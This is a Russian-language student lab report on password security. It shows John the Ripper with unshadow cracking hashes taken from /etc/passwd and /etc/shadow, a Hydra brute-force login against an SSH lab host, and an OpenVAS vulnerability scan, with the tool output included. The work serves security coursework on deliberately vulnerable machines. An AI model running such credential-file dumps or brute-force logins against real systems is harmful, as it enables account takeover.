# Отчет

## Задание:

1. Изучить вопрос безопасности паролей. Провести атаку на пароли с помощью John The Ripper+unshadow (оффлайн режим), Hydra (онлайн режим). В качестве инструкции можно использовать видеоматерилы или документ из доп материалов УрокMetasploitкоманды.docx
2. Установить Metasploit Framework(если не был установлен), настроить (как в методичке к уроке)
3. Проверить систему на базе ОС Windows на уязвимости, которые могут привести к атакам WannaCRY и подобного вредоносного ПО. Если система уязвима, при помощи MSF продемонстрируйте возможные векторы атак с использованием данной уязвимости.

## Выполнение:

### 1. Изучить вопрос безопасности паролей.

#### 1.1 Атака на пароли с помощью John The Ripper+unshadow (оффлайн режим):

##### Команды:

    unshadow /etc/passwd /etc/shadow > unshadow.txt
    john unshadow.txt --show


##### Результат:

    kali:kali:1000:1000:,,,:/home/kali:/bin/bash

    1 password hash cracked, 0 left

##### Скриншот консоли:

![Image](unshadow.png)


#### 1.2 Атака на пароли с помощью Hydra (онлайн режим):

##### Команды:

    hydra -l msfadmin ssh://192.168.1.172 -e nsr


##### Результат:

    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-27 15:14:19
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
    [DATA] attacking ssh://192.168.1.172:22/
    [22][ssh] host: 192.168.1.172   login: msfadmin   password: msfadmin
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-27 15:14:21


##### Скриншот консоли:

![Image](hydra.png)




2. Выполнение задания 2

    - Установлен DVL Linux 1.5;
    - Добавлен учетные данные (credentials) в OpenVAS;
    - Добавлен объект сканирования (target) в OpenVAS;
    - Создана и запущена задача сканирования.


### Скриншот отчета сканирования

![Image](scan_dvl15.png)
